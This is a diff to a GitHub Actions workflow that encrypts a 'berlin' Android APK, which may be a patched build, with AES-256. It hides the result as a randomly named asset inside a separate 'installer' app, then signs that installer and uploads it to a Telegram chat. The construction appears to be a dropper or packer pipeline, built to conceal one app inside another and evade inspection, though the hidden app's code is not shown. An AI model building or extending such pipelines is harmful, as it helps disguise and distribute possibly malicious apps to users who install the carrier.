@@ -87,3 +87,89 @@ jobs:
             -F "document=@${APK};filename=berlin_$(date +'%d-%m-%Y')_Build${{ github.run_number }}.apk" \
             -F "caption=✅ Berlin App Build Complete%0ASize: ${SIZE_MB} MB%0ABuild: #${{ github.run_number }}" \
             | python3 -c "import sys,json; r=json.load(sys.stdin); print('Telegram OK' if r.get('ok') else f'Telegram ERROR: {r}')"
+
+      # ── Berlin → Installer pipeline ──────────────────────────────────────────
+      # Runs after berlin is signed+verified. Encrypts berlin APK with AES-256-CBC,
+      # copies blob into installer assets, builds installer, sends installer to Telegram.
+
+      - name: Generate ASSET_C and BERLIN_KEY
+        id: berlin_keys
+        run: |
+          # Same logic as FingerprintPlugin.groovy Step 5+6 — generated BEFORE Gradle build
+          # so we can encrypt the blob first, then pass the same keys into Gradle via -P flags
+          ASSET_C=$(python3 -c "import os; print(os.urandom(4).hex() + '.bin')")
+          BERLIN_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
+          echo "ASSET_C=${ASSET_C}" >> $GITHUB_OUTPUT
+          echo "BERLIN_KEY=${BERLIN_KEY}" >> $GITHUB_OUTPUT
+          echo "ASSET_C   : ${ASSET_C}"
+          echo "BERLIN_KEY: ${BERLIN_KEY:0:16}..."
+
+      - name: Encrypt Berlin APK for installer
+        run: |
+          BERLIN_APK="berlin_signed.apk"
+          if [ ! -f "$BERLIN_APK" ]; then
+            BERLIN_APK="berlin_patched.apk"
+            echo "Using unsigned APK"
+          fi
+
+          ASSET_C="${{ steps.berlin_keys.outputs.ASSET_C }}"
+          BERLIN_KEY="${{ steps.berlin_keys.outputs.BERLIN_KEY }}"
+          OUTPUT="app/src/main/assets/${ASSET_C}"
+
+          echo "Encrypting ${BERLIN_APK} → ${OUTPUT}"
+          python3 berlin/scripts/encrypt_berlin_for_installer.py \
+            "${BERLIN_APK}" \
+            "${ASSET_C}" \
+            "${BERLIN_KEY}" \
+            "${OUTPUT}"
+
+          echo "=== Encrypted blob ==="
+          stat -c "%n : %s bytes" "${OUTPUT}"
+          # Verify blob starts with 16-byte IV (minimum 17 bytes)
+          BLOB_SIZE=$(stat -c%s "${OUTPUT}")
+          if [ "$BLOB_SIZE" -lt 17 ]; then
+            echo "ERROR: Encrypted blob too small (${BLOB_SIZE} bytes) — aborting"
+            exit 1
+          fi
+          echo "Blob OK: ${BLOB_SIZE} bytes"
+
+      - name: Build Installer APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease \
+            -Pberlin.assetC="${{ steps.berlin_keys.outputs.ASSET_C }}" \
+            -Pberlin.berlinKey="${{ steps.berlin_keys.outputs.BERLIN_KEY }}" \
+            --stacktrace 2>&1 | tail -60
+
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          if [ -z "$INSTALLER_APK" ]; then
+            echo "ERROR: Installer APK not found after build"
+            exit 1
+          fi
+          echo "INSTALLER_APK=${INSTALLER_APK}" >> $GITHUB_ENV
+          echo "Installer APK: ${INSTALLER_APK}"
+          stat -c "%n : %s bytes" "${INSTALLER_APK}"
+
+      - name: Sign Installer APK
+        run: |
+          python3 berlin/scripts/apk_signer.py \
+            "${{ env.INSTALLER_APK }}" \
+            installer_signed.apk
+          echo "INSTALLER_APK=installer_signed.apk" >> $GITHUB_ENV
+
+      - name: Send Installer to Telegram
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          APK="installer_signed.apk"
+          if [ ! -f "$APK" ]; then APK="${{ env.INSTALLER_APK }}"; fi
+          ASSET_C="${{ steps.berlin_keys.outputs.ASSET_C }}"
+          SIZE=$(stat -c%s "$APK")
+          SIZE_MB=$(echo "scale=2; $SIZE/1048576" | bc)
+          curl -s -X POST \
+            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+            -F "chat_id=${TELEGRAM_CHAT_ID}" \
+            -F "document=@${APK};filename=installer_berlin_$(date +'%d-%m-%Y')_Build${{ github.run_number }}.apk" \
+            -F "caption=✅ Installer + Berlin Build Complete%0ASize: ${SIZE_MB} MB%0ABuild: #${{ github.run_number }}%0AASSET_C: ${ASSET_C}" \
+            | python3 -c "import sys,json; r=json.load(sys.stdin); print('Telegram OK' if r.get('ok') else f'Telegram ERROR: {r}')"
